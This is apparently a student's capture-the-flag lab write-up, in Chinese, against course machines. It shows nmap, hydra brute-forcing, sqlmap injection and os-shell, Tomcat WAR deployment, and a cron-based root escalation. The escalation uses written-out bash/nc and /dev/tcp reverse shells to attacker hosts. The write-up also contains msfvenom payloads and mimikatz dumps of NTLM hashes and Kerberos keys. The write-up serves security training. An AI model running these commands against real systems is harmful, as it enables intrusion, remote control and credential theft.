80/tcp open  http

Nmap done: 4096 IP addresses (36 hosts up) scanned in 49.45 seconds

┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 10.0.2.164          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 20:48 EDT
Nmap scan report for 10.0.2.164
Host is up (0.15s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8009/tcp open  ajp13

Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds> 
```

### hydra
公开提示是ftp，所以用hydra攻击ftp服务。
这里使用了文本替换，先另外做了一个符合login:password格式的mirai-botnet.txt，再执行下面的命令。

对这个旗来说seclists白安装了。

```shell
┌──(kali㉿kali)-[~/Desktop/0919]
└─$ hydra -C mirai-botnet.txt ftp://10.0.2.164  
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-16 20:16:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 60 login tries, ~4 tries per task
[DATA] attacking ftp://10.0.2.164:21/
[21][ftp] host: 10.0.2.164   login: root   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-16 20:16:52

┌──(kali㉿kali)-[~/Desktop/0919]
└─$ ftp 10.0.2.164
Connected to 10.0.2.164.
220 Microsoft FTP Service
Name (10.0.2.164:kali): root
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||59358|)
125 Data connection already open; Transfer starting.
09-15-22  08:44AM                29199 flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg
226 Transfer complete.
ftp> lcd
Local directory now: /home/kali
ftp> lcd Desktop/
Local directory now: /home/kali/Desktop
ftp> get flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg
local: flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg remote: flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg
229 Entering Extended Passive Mode (|||59374|)
125 Data connection already open; Transfer starting.
100% |*********************************************| 29199      369.91 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 105 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
29199 bytes received in 00:00 (369.22 KiB/s)
226 Transfer complete.
ftp> exit
221 Goodbye.
```

## 扫描与漏洞发现
Web hacking/Password cracking
### nmap&hydra
```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 10.0.2.164 -p1-65535                                            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-18 09:31 EDT
Nmap scan report for 10.0.2.164
Host is up (0.031s latency).
Not shown: 65517 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
5986/tcp  open  wsmans
8009/tcp  open  ajp13
8282/tcp  open  libelle
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49677/tcp open  unknown

┌──(kali㉿kali)-[~/Desktop/0919]
└─$ hydra -C mirai-botnet.txt 10.0.2.164 -s 8282 http-get /manager/html 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-18 17:46:34
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 60 login tries, ~4 tries per task
[DATA] attacking http-get://10.0.2.164:8282/manager/html
[8282][http-get] host: 10.0.2.164   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-18 17:46:46

┌──(kali㉿kali)-[~/Desktop/0919]
└─$ curl http://10.0.2.164:8282/hacktheplanet-816494cc2ba913de/
<img src="C:\ProgramData\Tomcat9\webapps\hacktheplanet-816494cc2ba913de\flag{90b353a3878151640b532b0b30b5c828eab1855cdc97cb}.jpg" alt="wooow, what a flag"/>
```

这里记录一些没用的hydra命令：
> hydra -C mirai-botnet.txt 10.0.2.164 http-get -e ns /host-manager/ -s 8282  
> hydra -C mirai-botnet.txt 10.0.2.164 http-get /host-manager/ -s 8282   
> hydra -C mirai-botnet.txt 10.0.2.164 http-get /host-manager/html -s 8282     
> hydra -C mirai-botnet.txt 10.0.2.164 -s 8282 http-get /host-manager/html

也尝试了skipfish爬虫
> skipfish -o tomcat -C 'JSESSIONID=3A136C6599ACFB5CA6EE69C5C25A2FF9' http://10.0.2.164:8282/manager/html

### tomcat
java后台管理工具，可以手动上传war形式的app包

## Web crawling

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 10.0.3.107       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 20:51 EDT
Nmap scan report for 10.0.3.107
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
```
### skipfish
使用skipfish进行扫描，`skipfish -o test http://10.0.3.107`。跑一段时间。不需要用字典扫描。注意test是文件夹名称。
然后在文件夹里用grep找flag521即可找到对应的文件可以看对应的url
```
┌──(kali㉿kali)-[~/Desktop/0919]
└─$ grep -r flag      
test1/_i12/5/response.dat:<!-- flag{521bce090e5b9e19a5e7c2ec9642f27e1d641c5fd72aad} -->
......以及还有好多地方也有
```

## Database hacking
使用OWASP扫描https://10.0.3.107，Alerts: 若干

用curl登陆网页提交请求类似于：
```
curl -i -s -k -X  'POST'  \
 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'  -H 'Accept-Language: en-US,en;q=0.5'  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Content-Length: 45'  -H 'Origin: https://10.0.3.107'  -H 'Connection: keep-alive'  -H 'Referer: https://10.0.3.107/index.php'  -H 'Upgrade-Insecure-Requests: 1'  -H 'Sec-Fetch-Dest: document'  -H 'Sec-Fetch-Mode: navigate'  -H 'Sec-Fetch-Site: same-origin'  -H 'Sec-Fetch-User: ?1'  -H ''  \
--data-binary $'login=admin&password=admin&btnValider=Sign+in' \
'http://10.0.3.107/index.php'
```
……卡了好久，转战SQLMAP

### SQLMAP
首先到recherche_old抓一个请求，然后使用`sqlmap -r`注意这边会有很多要你选择的y/n
```
┌──(kali㉿kali)-[~]
└─$ sqlmap -r ./Desktop/0919/recherche.raw --dbs


[20:46:13] [INFO] fetching database names
available databases [5]:
[*] cuiteur
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

┌──(kali㉿kali)-[~]
└─$ sqlmap -r ./Desktop/0919/recherche.raw -D cuiteur --tables    
Database: cuiteur
[6 tables]
+-----------+
| blablas   |
| estabonne |
| flags     |
| mentions  |
| tags      |
| users     |
+-----------+


┌──(kali㉿kali)-[~]
└─$ sqlmap -r ./Desktop/0919/recherche.raw -D cuiteur -T flags --dump 

[1 entry]
+---------+------------------------------------------------------+
| flag_id | flag                                                 |
+---------+------------------------------------------------------+
| 32f28e  | flag{de3b1c0b21c23afd5b00f2cea90c1ad57508af8b47d866} |
+---------+------------------------------------------------------+

[20:59:16] [INFO] table 'cuiteur.flags' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.0.3.107/dump/cuiteur/flags.csv'                                                                
[20:59:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.0.3.107'                                                                                        

[*] ending @ 20:59:16 /2022-09-18/
```

这里记录一个没有什么卵用的nmap -O扫描：
```
  ┌──(kali㉿kali)-[~/Desktop]
  └─$ sudo nmap -O 10.0.3.107           
  Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 06:22 EDT
  Nmap scan report for 10.0.3.107
  Host is up (0.038s latency).
  Not shown: 997 closed tcp ports (reset)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  3306/tcp open  mysql
  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
  TCP/IP fingerprint:
  OS:SCAN(V=7.92%E=4%D=9/24%OT=22%CT=1%CU=36937%PV=Y%DS=2%DC=I%G=Y%TM=632EDA8
  OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(
  OS:O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11
  OS:NW7%O6=M54EST11)WIN(W1=FD00%W2=FD00%W3=FD00%W4=FD00%W5=FD00%W6=FD00)ECN(
  OS:R=Y%DF=Y%T=40%W=FF28%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
  OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
  OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
  OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
  OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

  Network Distance: 2 hops

  OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds
```


## Web hacking 

### sqlmap --os-shell  

注意到flag说明中有提到**install and use remote access trojans for remote system control,identify password files and extract passwords,exfiltrate data,**而sqlmap的--os-shell原理就是帮忙上传一个脚本以后可以用命令行进行操作。所以用上。
```
os-shell> hostname
do you want to retrieve the command standard output? [Y/n/a] 
command standard output: 'en2720-w11-energetic-bear'
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'www-data'
os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] 
command standard output: '/var/www/html/php'
os-shell> ls /home
do you want to retrieve the command standard output? [Y/n/a] 
command standard output: 

printer
sa_117153760595540998566
ubuntu

os-shell> ls ..
do you want to retrieve the command standard output? [Y/n/a] 
command standard output:

flag{3b20004ce00da2fe130041816c690d7dc53555ca3d3315}.jpg
html
images
index.html
index.php
php
styles
upload
```

找到了字符串，但是，尝试运行`$ sqlmap -r ~/Desktop/0926/r.raw --file-read "/var/www/html/flag{3b20004ce00da2fe130041816c690d7dc53555ca3d3315}.jpg"`失败了。
关于更多信息如Privileges等参考`[10:34:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.0.3.107'`
但是可以用完整的url通过浏览器把图片保存下来。

## Privilege escalation
### （失败）mysql用户密码
```
Database: cuiteur
Table: users
[11 columns]
+-------------------+------------------+
| Column            | Type             |
+-------------------+------------------+
| usAvecPhoto       | int(1) unsigned  |
| usBio             | char(255)        |
| usDateInscription | int(8) unsigned  |
| usDateNaissance   | int(8) unsigned  |
| usID              | int(10) unsigned |
| usMail            | char(80)         |
| usNom             | char(60)         |
| usPasse           | char(32)         |
| usPseudo          | char(30)         |
| usVille           | char(50)         |
| usWeb             | char(120)        |
+-------------------+------------------+

Database: mysql
Table: user
[45 columns]
+------------------------+-----------------------------------+
| Column                 | Type                              |
+------------------------+-----------------------------------+
| User                   | char(32)                          |
| account_locked         | enum('N','Y')                     |
| Alter_priv             | enum('N','Y')                     |
| Alter_routine_priv     | enum('N','Y')                     |
| authentication_string  | text                              |
| Create_priv            | enum('N','Y')                     |
| Create_routine_priv    | enum('N','Y')                     |
| Create_tablespace_priv | enum('N','Y')                     |
| Create_tmp_table_priv  | enum('N','Y')                     |
| Create_user_priv       | enum('N','Y')                     |
| Create_view_priv       | enum('N','Y')                     |
| Delete_priv            | enum('N','Y')                     |
| Drop_priv              | enum('N','Y')                     |
| Event_priv             | enum('N','Y')                     |
| Execute_priv           | enum('N','Y')                     |
| File_priv              | enum('N','Y')                     |
| Grant_priv             | enum('N','Y')                     |
| Host                   | char(60)                          |
| Index_priv             | enum('N','Y')                     |
| Insert_priv            | enum('N','Y')                     |
| Lock_tables_priv       | enum('N','Y')                     |
| max_connections        | int(11) unsigned                  |
| max_questions          | int(11) unsigned                  |
| max_updates            | int(11) unsigned                  |
| max_user_connections   | int(11) unsigned                  |
| password_expired       | enum('N','Y')                     |
| password_last_changed  | timestamp                         |
| password_lifetime      | smallint(5) unsigned              |
| plugin                 | char(64)                          |
| Process_priv           | enum('N','Y')                     |
| References_priv        | enum('N','Y')                     |
| Reload_priv            | enum('N','Y')                     |
| Repl_client_priv       | enum('N','Y')                     |
| Repl_slave_priv        | enum('N','Y')                     |
| Select_priv            | enum('N','Y')                     |
| Show_db_priv           | enum('N','Y')                     |
| Show_view_priv         | enum('N','Y')                     |
| Shutdown_priv          | enum('N','Y')                     |
| ssl_cipher             | blob                              |
| ssl_type               | enum('','ANY','X509','SPECIFIED') |
| Super_priv             | enum('N','Y')                     |
| Trigger_priv           | enum('N','Y')                     |
| Update_priv            | enum('N','Y')                     |
| x509_issuer            | blob                              |
| x509_subject           | blob                              |
+------------------------+-----------------------------------+
```

使用--sql-shell寻找

```
select table_name,column_name from information_schema.columns where column_name like '%pwd%' or column_name like '%pass%'	
[*] users, usPasse

[*] servers, Password
[*] slave_master_info, User_password
[*] user, password_expired
[*] user, password_last_changed
[*] user, password_lifetime
[*] events_statements_current, SORT_MERGE_PASSES
[*] events_statements_history, SORT_MERGE_PASSES
[*] events_statements_history_long, SORT_MERGE_PASSES
[*] events_statements_summary_by_account_by_event_name, SUM_SORT_MERGE_PASSES
[*] events_statements_summary_by_digest, SUM_SORT_MERGE_PASSES
[*] events_statements_summary_by_host_by_event_name, SUM_SORT_MERGE_PASSES
[*] events_statements_summary_by_program, SUM_SORT_MERGE_PASSES
[*] events_statements_summary_by_thread_by_event_name, SUM_SORT_MERGE_PASSES
[*] events_statements_summary_by_user_by_event_name, SUM_SORT_MERGE_PASSES
[*] events_statements_summary_global_by_event_name, SUM_SORT_MERGE_PASSES
[*] prepared_statements_instances, SUM_SORT_MERGE_PASSES
[*] statement_analysis, sort_merge_passes
[*] statements_with_sorting, sort_merge_passes
[*] x$statement_analysis, sort_merge_passes
[*] x$statements_with_sorting, sort_merge_passes
```

1. 查看了cuiteur里面的用户名和密码。确认了它使用md5算法。
看起来都不是很有用。
2. mysql里面有user，表中的authentication_string可能有用，为40位猜想是sha1算法

```
[12:59:06] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
select host,user,authentication_string from mysql.user [4]:
[*] localhost, root, *452DA4106433AC8BA0B0888B103F83DB4FBF5B14
[*] localhost, mysql.session, *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] localhost, mysql.sys, *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] localhost, debian-sys-maint, *FC646E0B2DACA6543FBE5D1705235A4B40231BA9

The following 7 hash-modes match the structure of your input hash:

    # | Name                                                | Category
======+=====================================================+======================================
  100 | SHA1                                                | Raw Hash
  6000 | RIPEMD-160                                          | Raw Hash
  170 | sha1(utf16le($pass))                                | Raw Hash
  4700 | sha1(md5($pass))                                    | Raw Hash salted and/or iterated
18500 | sha1(md5(md5($pass)))                               | Raw Hash salted and/or iterated
  4500 | sha1(sha1($pass))                                   | Raw Hash salted and/or iterated
  300 | MySQL4.1/MySQL5                                     | Database Server

┌──(kali㉿kali)-[~/Desktop/0926]
└─$ hash-identifier      
 HASH: 452DA4106433AC8BA0B0888B103F83DB4FBF5B14               
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

关于hashcat的比较清楚的教程：https://apt404.github.io/2017/04/26/use-hashcat-crack-hash/

换别的方法。
### os-shell升级meterpreter
os-shell虽然不能换目录，但是nc没有问题。把msfvenom生成的后门用os-shell传到目标机器，运行，然后
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >  set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.0.7
LHOST => 192.168.0.7
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
```

### （失败）使用local_exploit_suggester
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.0.3.107 - Collecting local exploits for php/linux...
[-] 10.0.3.107 - No suggestions available.
```
没有建议方案。

### （失败）SUID提权方法
首先`exploit/linux/local/ktsuss_suid_priv_esc`失败了。
手动查找：
```
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/snapd/17029/usr/lib/snapd/snap-confine
/snap/core18/2538/bin/mount
/snap/core18/2538/bin/ping
/snap/core18/2538/bin/su
/snap/core18/2538/bin/umount
/snap/core18/2538/usr/bin/chfn
/snap/core18/2538/usr/bin/chsh
/snap/core18/2538/usr/bin/gpasswd
/snap/core18/2538/usr/bin/newgrp
/snap/core18/2538/usr/bin/passwd
/snap/core18/2538/usr/bin/sudo
/snap/core18/2538/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2538/usr/lib/openssh/ssh-keysign
/snap/core18/2566/bin/mount
/snap/core18/2566/bin/ping
/snap/core18/2566/bin/su
/snap/core18/2566/bin/umount
/snap/core18/2566/usr/bin/chfn
/snap/core18/2566/usr/bin/chsh
/snap/core18/2566/usr/bin/gpasswd
/snap/core18/2566/usr/bin/newgrp
/snap/core18/2566/usr/bin/passwd
/snap/core18/2566/usr/bin/sudo
/snap/core18/2566/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2566/usr/lib/openssh/ssh-keysign
```

suid搜索到的ping和一个安全的find的比较

```
ls -l /bin/ping
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
ls -l /usr/bin/find
-rwxr-xr-x 1 root root 238080 Nov  5  2017 /usr/bin/find
```
举例。如果find也是suid权限，那么可以运行`find 某文件 -exec whoami \`

### 枚举，使用LinEnum
详细内容见[./linenum.txt]

可以找到cron.hourly，找到一个可以修改的文件cuiteur-cleaning

python的交互式shell
```
sudo python3 -c 'import pty;pty.spawn("/bin/sh")'
$ cd /etc/cron.hourly
cd /etc/cron.hourly
$ ls -la
ls -la
total 16
drwxr-xr-x   2 root     root     4096 Oct  3 00:27 .
drwxr-xr-x 106 root     root     4096 Oct  3 00:45 ..
-rw-r--r--   1 root     root      102 Nov 16  2017 .placeholder
-rwxrw-rw-   1 www-data www-data  502 Oct  3 00:27 cuiteur-cleaning
$ cat .placeholder
cat .placeholder
#DO NOT EDIT OR REMOVE
#This file is a simple placeholder to keep dpkg from removing this directory
$ cat cuiteur-cleaning
cat cuiteur-cleaning
#!/bin/bash

/bin/chmod -R 755 /root
/bin/chmod 755 /root/flag{9f1f16a4aa83a78818defd059852fc1f2bfbf02882fbb5}.jpg
/bin/chmod 755 /root/flag{3b200098aa585d4078530733472b7f4ee0fc60702e32d9}.jpg
/bin/echo -e "corner\ncorner" | /usr/bin/passwd root
/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.3 7878 > /tmp/tfl
/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7979 > /tmp/tfl
```
这个/etc/cron.hourly/cuiteur-cleaning就是关键文件。
加上一行到自己的nc端口，然后本地nc监听，进入root
`/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.7 9997 > /tmp/tfl`

其他思路：   
运行`msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.7 LPORT=9997 > -f raw > payload.sh`，查看内容，模仿写：`/bin/bash -c '0<&69-;exec 69<>/dev/tcp/192.168.0.7/4444;sh <&69 >&69 2>&69'`
然后`msf> set PAYLOAD payload/cmd/unix/reverse_bash`

或者 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.7 LPORT=9997 -f raw -o mtpr9997.elf`，写一行`/tmp/mtpr9997.elf`


## Hash cracking
首先现在已经能登进tomcat的应用管理了，查询到可以利用包的部署建立反向shell。
https://www.wangan.com/p/7fy7fg748f43d1c0
利用msfvenom创建war包的方法
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

（另外：使用PUT方法可以上传任意文件，但限制了jsp后缀的上传。
```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.7 LPORT=4444 -f war > ./0926/test.war
┌──(kali㉿kali)-[~/Desktop/0926]
└─$ msfconsole 
msf6 > use exploit/multi/http/tomcat_mgr_uploadset
[-] No results from search
[-] Failed to load module: exploit/multi/http/tomcat_mgr_uploadset
msf6 > use exploit/multi/http/tomcat_
use exploit/multi/http/tomcat_jsp_upload_bypass  use exploit/multi/http/tomcat_mgr_upload
use exploit/multi/http/tomcat_mgr_deploy         
msf6 > use exploit/multi/http/tomcat_mgr_deploy 
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[-] Msf::OptionValidateError The following options failed to validate: LHOST
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > set lhost 192.168.0.7
lhost => 192.168.0.7
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.0.7:4444 
[*] Command shell session 1 opened (192.168.0.7:4444 -> 10.0.2.164:64126) at 2022-09-25 19:28:45 -0400
C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.21>

C:\>hostname
hostname
en2720-w11-lazarus

C:\>net user
net user

User accounts for \\

Administrator            crash_override           DefaultAccount           
goldstein                Guest                    lord_nikon               
mr_babbage               phantom_phreak           printer                  
razor                    root                     the_plague               
WDAGUtilityAccount       zero_cool 
The command completed with one or more errors.

c:\ethhak>whoami
whoami
nt authority\system
```
LocalSystem Account. The name of this account is NT Authority\SYSTEM. It is a built-in Windows Account and is the most powerful account which has unrestricted access to all local system resources, it is more powerful than any admin account.

```shell
C:\>md ethhak
c:\ethhak>reg save HKLM\SYSTEM sys.hiv
c:\ethhak>reg save HKLM\SAM sam.hiv
c:\ethhak>copy c:\ethhak\sam.hiv c:\ProgramData\Tomcat9\webapps\test\sam
c:\ethhak>copy c:\ethhak\system.hiv c:\ProgramData\Tomcat9\webapps\test\sys
```

https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

- 失败的win-linux传递
  bitsadmin /transfer n https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip c:\ethhak\mimik.zip

  powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip','c:\ethhak\mimik.zip')

  scp C:\Users\Desktop\webtest\1.zip root@192.168.1.1:/home/admin

### mimikatz
在自己机器上运行mimikatz

```shell

mimikatz # lsadump::sam /sam:sam /system:sys
mimikatz # lsadump::sam /sam:sam /system:sys
Domain : EN2720-W11-LAZA
SysKey : 59e7a1c9940dab865bbab3c1bc73f4b4
Local SID : S-1-5-21-1742023530-4038833925-3247209358

SAMKey : acbe7b0f1aaecbc583de1292b081b54e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: b26f80138894f9d4803a0d5551db7e05

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e4f56e0f67086a768cfa407dfcba6251

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6e97a83c4c69d40378063ce0008ed1f90a88c1c07823ea684dab1323b6f65f40
      aes128_hmac       (4096) : 770520683a04b8ff21da105f9ff8d284
      des_cbc_md5       (4096) : da686ba2df5bf7e3

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEAdministrator
    Credentials
      des_cbc_md5       : da686ba2df5bf7e3


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e8 (1000)
User : printer
  Hash NTLM: acfea7a605bfdc549d2075e23af57a14

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 96e1a96bee0a986c881f133fc71dd6a4

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEprinter
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : eeede49b2b33c6392013b23983e8aa84a5417ffdda9c42e31163a8f0abcf20a2
      aes128_hmac       (4096) : b09c358fa17eb8f32869cbd8f2e51af5
      des_cbc_md5       (4096) : d6c497087a517c23
    OldCredentials
      aes256_hmac       (4096) : 16f849df282d2beb3baefc743e44a63e9e7377f9dad8ae9b79f6232a7b4a3822
      aes128_hmac       (4096) : bc21cb13f8232480afa9bece4be88af0
      des_cbc_md5       (4096) : 45a41316a20db0da
    OlderCredentials
      aes256_hmac       (4096) : c1fbd912f9e4604988b26778e221a1f7b08e1d70d9246f895e1bff1a41b8bbbb
      aes128_hmac       (4096) : 733fe6a494c88c9aa332d8301a60f604
      des_cbc_md5       (4096) : 236b7acd7fcd25e3

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEprinter
    Credentials
      des_cbc_md5       : d6c497087a517c23
    OldCredentials
      des_cbc_md5       : 45a41316a20db0da


RID  : 000003ea (1002)
User : phantom_phreak
  Hash NTLM: 29666240aa0a490beb84f5345f823f86
<!-- chamberlain -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d4cc8ac89c524a77c928b4640a3ea47b

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEphantom_phreak
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b79f99b5985038cecc5dcfa6bfac25e38a2c5edd087ac715d706497a65317a31
      aes128_hmac       (4096) : 0651284ac1b8beaa34571b6e7de690a8
      des_cbc_md5       (4096) : a4153107d564a107
    OldCredentials
      aes256_hmac       (4096) : 983a89a10557ba59977639d329568cb37e4885d4bc2d5b4a865790c2722d1741
      aes128_hmac       (4096) : 1c900324ca5db3529665db4c3b9e8081
      des_cbc_md5       (4096) : a449bf10bafe078a
    OlderCredentials
      aes256_hmac       (4096) : 0b18af61280498f386dcfc42f032e84c401ac3246e7d75edaa12caa4edec22f4
      aes128_hmac       (4096) : 539af98c87b94df0ca20f20d987a8f00
      des_cbc_md5       (4096) : 1a0d9be33b838c10

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEphantom_phreak
    Credentials
      des_cbc_md5       : a4153107d564a107
    OldCredentials
      des_cbc_md5       : a449bf10bafe078a


RID  : 000003eb (1003)
User : goldstein
  Hash NTLM: a164b4c9a22454723f2c25c7ec8ade22
<!-- barragan -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : db5ebaf18bb162df84f94e655f922e55

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEgoldstein
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3da995fb64d7eb2517a7fe32beb63476cd5e63f545eba5a6ca2af1f2ae54fb50
      aes128_hmac       (4096) : e1cf5ba610b2592cec154a00438ed33b
      des_cbc_md5       (4096) : d5f2d53d38bcf8ef
    OldCredentials
      aes256_hmac       (4096) : d100df7b49cf14ff053f990ac91ef4cfd10a74b57aae3ba2b748ada799fa0e15
      aes128_hmac       (4096) : 4caf1e6269543c6ff979a99a475bd911
      des_cbc_md5       (4096) : 4c7a6825674c1fcb

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEgoldstein
    Credentials
      des_cbc_md5       : d5f2d53d38bcf8ef
    OldCredentials
      des_cbc_md5       : 4c7a6825674c1fcb


RID  : 000003ec (1004)
User : crash_override
